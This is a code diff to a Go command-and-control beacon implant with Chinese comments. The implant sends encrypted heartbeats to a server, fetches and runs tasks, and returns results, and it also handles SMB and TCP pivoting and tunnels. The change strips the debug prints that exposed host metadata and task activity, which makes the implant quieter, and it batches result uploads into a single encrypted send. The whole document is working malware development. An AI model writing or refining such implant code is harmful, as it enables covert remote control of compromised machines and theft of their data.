@@ -71,11 +71,6 @@ func (a *Agent) Run() int {
 		return -1
 	}
 
-	fmt.Println("[*] Beacon modular Go starting...")
-	fmt.Printf("[*] Metadata: OS=%s Arch=%s User=%s IP=%s\n",
-		a.Ctx.Meta.OS, a.Ctx.Meta.Arch, a.Ctx.Meta.Username, a.Ctx.Meta.InternalIP)
-	fmt.Printf("[*] BeaconID: %d\n", a.Ctx.BeaconID)
-
 	if isInternalProfile() {
 		switch strings.ToLower(profile.GlobalProfile.Protocol) {
 		case "tcp":
@@ -83,7 +78,6 @@ func (a *Agent) Run() int {
 		case "smb":
 			return a.runInternalSMB()
 		default:
-			fmt.Printf("[!] Unsupported internal protocol: %s\n", profile.GlobalProfile.Protocol)
 			return -1
 		}
 	}
@@ -103,32 +97,29 @@ func (a *Agent) runExternal() int {
 		// 2. 构建心跳明文并加密
 		plain, err := a.buildHeartbeatPlain()
 		if err != nil {
-			fmt.Printf("[!] Pack heartbeat error: %v\n", err)
 			continue
 		}
 
 		heartbeat, err := crypt.EncryptHeartbeat(profile.GlobalProfile.HTTP.EncryptKey, plain)
 		if err != nil {
-			fmt.Printf("[!] Encryption error: %v\n", err)
 			continue
 		}
 
 		// 3. 发送心跳，获取服务端返回的加密任务
 		response, err := a.client.Exchange(heartbeat, nil)
 		if err != nil {
-			fmt.Printf("[!] Communication error: %v\n", err)
 			continue
 		}
 
 		// 4. 解密并执行任务，结果写入 Outbox
 		a.dispatchTasks(response)
 
-		// 5. 将传输和隧道的挂起数据包入队
+		// 5. 同 tick 收割隧道（短暂等待 worker 入队后排空），并排空传输/级联队列
 		a.flushTransfers()
-		a.flushTunnels()
+		a.harvestTunnels()
 		a.flushCascade()
 
-		// 6. 逐个加密并发送 Outbox 中的结果
+		// 6. 批量回传 Outbox 中的结果（一次加密、一次发送；失败整批回塞）
 		a.flushOutbox(heartbeat)
 	}
 
@@ -154,7 +145,6 @@ func (a *Agent) sleep() {
 		sleepFor += time.Duration((int64(r) * int64(sleepFor)) / 100)
 	}
 
-	fmt.Printf("[*] Sleeping for %v...\n", sleepFor)
 	time.Sleep(sleepFor)
 }
 
@@ -190,7 +180,6 @@ func (a *Agent) dispatchTasks(encryptedTasks []byte) {
 	// 用会话密钥解密任务
 	plain, err := crypt.DecryptTask(a.Ctx.SessionKey, encryptedTasks)
 	if err != nil {
-		fmt.Printf("[*] No tasks or decrypt error: %v\n", err)
 		return
 	}
 
@@ -199,7 +188,6 @@ func (a *Agent) dispatchTasks(encryptedTasks []byte) {
 	for outer.Size() > 0 {
 		taskBlock := outer.ParseBytes()
 		if outer.HasError() {
-			fmt.Printf("[!] Parse task block error: %v\n", outer.Error())
 			break
 		}
 
@@ -212,7 +200,6 @@ func (a *Agent) dispatchTasks(encryptedTasks []byte) {
 			continue
 		}
 
-		fmt.Printf("[*] Received Task ID: %d, Command ID: %d\n", taskID, commandID)
 		results, err := a.handler.Handle(taskID, commandID, payload)
 		if err != nil {
 			a.enqueueFinal(taskID, commandID, []byte(fmt.Sprintf("error: %v", err)))
@@ -262,34 +249,52 @@ func (a *Agent) flushTunnels() {
 	}
 }
 
+// harvestTunnels 同 tick 收割：短暂等待 worker 入队后再排空，
+// 避免响应落到下一轮 sleep（对齐 C 版 AgentHarvestTunnels）。
+func (a *Agent) harvestTunnels() {
+	a.handler.HarvestTunnels()
+	a.flushTunnels()
+}
+
 func (a *Agent) flushCascade() {
 	for _, pkt := range a.handler.GetPendingCascadePackets() {
 		a.Ctx.Outbox.Enqueue(pkt)
 	}
 }
 
-// flushOutbox 逐个取出 Outbox 中的结果包，加密后发送给服务端。
-// 发送失败时将未发送的包重新压回队列头部，等待下次心跳重试。
+// flushOutbox 批量回传 Outbox 中的结果包（对齐 C 版 AgentFlushOutbox 批量版）：
+// drain → 拼接所有包为一个明文 buffer → 一次加密 → 一次发送 →
+// 成功后分派响应任务并补排空隧道（不等待，不新开 C2 往返）。
+// 失败语义：拼接/加密/发送任一步失败，整批回塞队列头部，下个 tick 重试，不丢包。
 func (a *Agent) flushOutbox(heartbeat []byte) {
-	for cur := a.Ctx.Outbox.Drain(); cur != nil; {
-		next := cur.next
-		cur.next = nil
-
-		encrypted, err := crypt.EncryptResult(a.Ctx.SessionKey, cur.packet)
-		if err != nil {
-			cur.next = next
-			a.Ctx.Outbox.PushFrontList(cur)
-			return
-		}
-
-		response, err := a.client.Exchange(heartbeat, encrypted)
-		if err != nil {
-			cur.next = next
-			a.Ctx.Outbox.PushFrontList(cur)
-			return
-		}
-		a.dispatchTasks(response)
-
-		cur = next
+	list := a.Ctx.Outbox.Drain()
+	if list == nil {
+		return
 	}
+
+	// 1. 把所有 outbox 包拼接成一个明文 buffer（多个 MakeFinalPacket 长度前缀块顺序拼接）
+	plain := make([]byte, 0, 4096)
+	for cur := list; cur != nil; cur = cur.next {
+		plain = append(plain, cur.packet...)
+	}
+
+	// 2. 一次加密所有包
+	encrypted, err := crypt.EncryptResult(a.Ctx.SessionKey, plain)
+	if err != nil {
+		a.Ctx.Outbox.PushFrontList(list)
+		return
+	}
+
+	// 3. 一次发送
+	response, err := a.client.Exchange(heartbeat, encrypted)
+	if err != nil {
+		a.Ctx.Outbox.PushFrontList(list)
+		return
+	}
+
+	// 4. 发送成功：节点丢弃（Go 无需显式释放）
+
+	// 5. 分派响应里的任务（一次），再补排空隧道（不等待）
+	a.dispatchTasks(response)
+	a.flushTunnels()
 }
